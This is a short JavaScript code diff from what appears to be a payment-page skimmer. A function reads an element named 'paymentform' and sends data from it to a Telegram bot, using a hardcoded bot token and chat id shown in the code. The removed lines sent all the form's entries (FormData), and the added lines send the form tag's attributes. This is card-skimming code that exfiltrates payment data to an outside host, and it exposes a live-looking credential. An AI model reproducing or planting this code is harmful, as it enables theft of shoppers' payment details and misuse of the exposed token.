@@ -1,5 +1,4 @@
 var x = document.getElementById("addpayment");
-var form = document.getElementById('paymentform');
 let tg = {
     token: "6786942281:AAEEMylFUD0IvUA50LQ2VKLDy5cStMELz3I", // Your bot's token that got from @BotFather
     chat_id: "-1002152188424" // The user's(that you want to send a message) telegram chat id
@@ -14,10 +13,13 @@ function sendMessage(text)
 }
 function myFunction() 
 {
-    const data = new FormData(form);
+var element = document.getElementById("paymentform");
+var openTag = "<"+element.tagName;
+for (var i = 0; i < element.attributes.length; i++) {
+    var attrib = element.attributes[i];
+    openTag += " "+attrib.name + "=" + attrib.value;
+}
+openTag += ">";
 
-  // Do a bit of work to convert the entries to a plain JS object
-const value = Object.fromEntries(data.entries());
-
-  sendMessage(value);
+  sendMessage(openTag);
 }
